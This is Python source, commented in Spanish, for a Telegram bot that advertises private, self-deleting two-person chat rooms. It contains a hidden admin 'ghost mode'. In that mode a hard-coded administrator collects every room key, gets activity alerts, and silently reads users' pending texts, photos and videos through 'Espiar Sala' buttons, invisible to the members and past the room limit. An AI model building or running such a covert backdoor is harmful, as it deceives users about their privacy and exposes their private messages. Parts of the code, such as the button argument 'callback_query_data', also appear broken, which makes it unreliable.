import asyncio
import logging
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters, CallbackQueryHandler

# --- CONFIGURACIÓN ---
TOKEN = 'TU_TOKEN_AQUI'
ADMIN_ID = 610413875 
# ---------------------

rooms = {}             
user_to_room = {}      
waiting_for_key = set()
monitor_active = {}    
offline_rooms_log = [] 

logging.basicConfig(level=logging.INFO)

BTN_ENTRAR = '🔑 Entrar a Sala'
BTN_SALIR = '🚪 Salir de la Sala'
BTN_MONITOR = '📡 Monitor: ON/OFF'
BTN_LIMPIAR_SALA = '🧹 Limpiar Sala'

async def delete_msg(context, chat_id, message_id, delay=0):
    if delay > 0: await asyncio.sleep(delay)
    try: await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except: pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
    
    kb = [[BTN_ENTRAR]]
    if user_id == ADMIN_ID: kb.append([BTN_MONITOR])
    
    markup = ReplyKeyboardMarkup(kb, resize_keyboard=True, is_persistent=True)
    await update.message.reply_text("✨ Modo Privado Listo ✨", reply_markup=markup)

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id
    text = update.message.text

    # --- LÓGICA MONITOR (ADMIN) ---
    if text == BTN_MONITOR and user_id == ADMIN_ID:
        asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
        is_now_active = not monitor_active.get(user_id, False)
        monitor_active[user_id] = is_now_active
        
        estado = "ON (Modo Fantasma)" if is_now_active else "OFF (Modo Usuario)"
        await update.message.reply_text(f"📡 Monitor: {estado}")
        
        if is_now_active:
            if offline_rooms_log:
                reporte = "📂 **Salas creadas en OFF:**\n" + "\n".join([f"• `{r}`" for r in offline_rooms_log])
                await context.bot.send_message(chat_id=ADMIN_ID, text=reporte)
                offline_rooms_log.clear()
            await mostrar_menu_gestion(update, context)
        return

    # --- BOTÓN LIMPIAR ---
    if text == BTN_LIMPIAR_SALA and user_id == ADMIN_ID and monitor_active.get(user_id):
        asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
        room_name = user_to_room.get(user_id)
        if room_name in rooms:
            rooms[room_name]["pending"] = []
            msg = await update.message.reply_text(f"🧹 Sala `{room_name}` vaciada.")
            asyncio.create_task(delete_msg(context, user_id, msg.message_id, 3))
        return

    # --- BOTÓN SALIR ---
    if text == BTN_SALIR:
        asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
        if user_id in user_to_room:
            room_name = user_to_room.pop(user_id)
            if room_name in rooms and user_id in rooms[room_name].get("members", []):
                rooms[room_name]["members"].remove(user_id)
            
            kb = [[BTN_ENTRAR]]
            if user_id == ADMIN_ID: kb.append([BTN_MONITOR])
            markup = ReplyKeyboardMarkup(kb, resize_keyboard=True, is_persistent=True)
            await context.bot.send_message(chat_id=user_id, text="👋 Sesión finalizada.", reply_markup=markup)
        return

    # --- BOTÓN ENTRAR ---
    if text == BTN_ENTRAR:
        asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
        waiting_for_key.add(user_id)
        msg = await update.message.reply_text("🔑 A qué sala deseas entrar?:", reply_markup=ReplyKeyboardRemove())
        asyncio.create_task(delete_msg(context, user_id, msg.message_id, 10))
        return

    # --- PROCESAR CLAVE ---
    if user_id in waiting_for_key:
        room_key = text
        waiting_for_key.remove(user_id)
        asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
        
        if room_key not in rooms:
            rooms[room_key] = {"members": [], "pending": []}
            if not monitor_active.get(ADMIN_ID, False):
                if room_key not in offline_rooms_log: offline_rooms_log.append(room_key)
            else:
                await context.bot.send_message(chat_id=ADMIN_ID, text=f"📂 [NUEVA]: `{room_key}`")
        
        room = rooms[room_key]
        is_ghost = (user_id == ADMIN_ID and monitor_active.get(ADMIN_ID, False))

        if not is_ghost:
            if user_id not in room["members"] and len(room["members"]) >= 2:
                msg = await update.message.reply_text("🚫 Sala llena.")
                asyncio.create_task(delete_msg(context, user_id, msg.message_id, 3))
                return
            if user_id not in room["members"]: room["members"].append(user_id)

        user_to_room[user_id] = room_key
        kb_sala = [[BTN_SALIR]]
        if is_ghost: kb_sala[0].append(BTN_LIMPIAR_SALA)
        
        markup = ReplyKeyboardMarkup(kb_sala, resize_keyboard=True, is_persistent=True)
        await update.message.reply_text("😈 Fantasma" if is_ghost else "🔓 Conectado", reply_markup=markup)

        for item in list(room["pending"]):
            if is_ghost or item["sender"] != user_id:
                await deliver_content(context, user_id, item, room_key, is_ghost=is_ghost)
        return

    if user_id in user_to_room:
        await process_message(update, context)

async def mostrar_menu_gestion(update: Update, context: ContextTypes.DEFAULT_TYPE):
    salas_activas = [name for name, data in rooms.items() if data["pending"]]
    if salas_activas:
        keyboard = []
        for s in salas_activas:
            keyboard.append([InlineKeyboardButton(f"👁 Espiar Sala: {s}", callback_query_data=f"view_{s}")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=ADMIN_ID, text="🛠 **Salas con mensajes pendientes:**", reply_markup=reply_markup)
    else:
        await context.bot.send_message(chat_id=ADMIN_ID, text="✅ No hay mensajes acumulados.")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data
    await query.answer()

    if data.startswith("view_"):
        room_name = data.replace("view_", "")
        user_to_room[user_id] = room_name
        markup = ReplyKeyboardMarkup([[BTN_SALIR, BTN_LIMPIAR_SALA]], resize_keyboard=True, is_persistent=True)
        await context.bot.send_message(chat_id=user_id, text=f"🕵️ Entrando a `{room_name}`...", reply_markup=markup)
        room = rooms[room_name]
        for item in list(room["pending"]):
            await deliver_content(context, user_id, item, room_name, is_ghost=True)

async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id
    room_name = user_to_room[user_id]
    room = rooms[room_name]
    is_ghost = (user_id == ADMIN_ID and monitor_active.get(ADMIN_ID, False))
    
    # --- BORRADO EMISOR: 3 segundos ---
    asyncio.create_task(delete_msg(context, user_id, update.message.message_id, 3))
    
    if is_ghost:
        msg = await update.message.reply_text("⚠️ Solo lectura en modo fantasma.")
        asyncio.create_task(delete_msg(context, user_id, msg.message_id, 3))
        return

    content_item = {"sender": user_id}
    if update.message.text: 
        content_item.update({"type": "text", "content": update.message.text, "len": len(update.message.text)})
    elif update.message.photo: 
        content_item.update({"type": "photo", "content": update.message.photo[-1].file_id, "len": 999})
    elif update.message.video: 
        content_item.update({"type": "video", "content": update.message.video.file_id, "len": 999})
    else: return

    # --- NOTIFICACIÓN INTELIGENTE PARA ADMIN ---
    if user_id != ADMIN_ID:
        # Solo notifica si el Admin NO está actualmente en esa misma sala
        if user_to_room.get(ADMIN_ID) != room_name:
            msg_alert = f"🕵️ Actividad en: `{room_name}`" if monitor_active.get(ADMIN_ID, False) else "🔔 Actividad en sistema."
            await context.bot.send_message(chat_id=ADMIN_ID, text=msg_alert)

    others = [m for m in room["members"] if m != user_id]
    if not others:
        room["pending"].append(content_item)
    else:
        for m_id in others:
            if user_to_room.get(m_id) == room_name:
                await deliver_content(context, m_id, content_item, room_name, is_ghost=False)
            else:
                room["pending"].append(content_item)
                # Notificación para usuario normal fuera de sala
                n_msg = await context.bot.send_message(chat_id=m_id, text="📩 Nuevo mensaje pendiente.")
                asyncio.create_task(delete_msg(context, m_id, n_msg.message_id, 5))

async def deliver_content(context, chat_id, item, room_name, is_ghost=False):
    msg_type, content = item["type"], item["content"]
    try:
        if msg_type == "text":
            sent = await context.bot.send_message(chat_id=chat_id, text=f"💬:\n{content}")
        elif msg_type == "photo":
            sent = await context.bot.send_photo(chat_id=chat_id, photo=content)
        elif msg_type == "video":
            sent = await context.bot.send_video(chat_id=chat_id, video=content)

        # --- BORRADO RECEPTOR INTELIGENTE ---
        if not is_ghost:
            # 7s si texto corto (<100), 10s si es largo o multimedia
            delay = 7 if item.get("len", 0) < 100 else 10
            asyncio.create_task(delete_msg(context, chat_id, sent.message_id, delay))
            
            if item in rooms[room_name].get("pending", []):
                rooms[room_name]["pending"].remove(item)
    except: pass

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_text))
    app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO, process_message))
    app.run_polling()